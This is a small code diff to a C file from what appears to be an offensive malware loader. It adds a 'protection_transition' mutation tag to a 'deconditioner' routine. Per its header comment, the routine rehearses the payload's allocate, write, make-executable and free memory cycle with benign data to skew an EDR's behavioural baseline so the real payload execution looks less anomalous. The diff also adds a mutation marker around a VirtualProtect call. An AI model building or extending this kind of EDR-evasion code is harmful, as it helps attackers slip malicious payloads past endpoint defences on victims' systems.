@@ -3,7 +3,7 @@
  * DESC: Rehearses the carrier's Alloc(RW) → Write → Protect(RX) → Free loop
  *       with benign data for DECON_ROUNDS iterations. Normalizes the EDR's
  *       behavioral baseline so the real carrier execution is less anomalous.
- * MUTATIONS: loop_mutation, timing_jitter, api_swap, literal_encoding, loop_restructuring
+ * MUTATIONS: loop_mutation, timing_jitter, api_swap, literal_encoding, loop_restructuring, protection_transition
  */
 #include "../header/definitions.h"
 
@@ -32,6 +32,7 @@ void deconditioner() {
         }
 
         // @MUTATE:timing_jitter
+        // @MUTATE:protection_transition
         // @MUTATE:api_wrapper_injection(VirtualProtect)
         VirtualProtect(buf, PAYLOAD_LEN, p_RX, &old_prot);
 
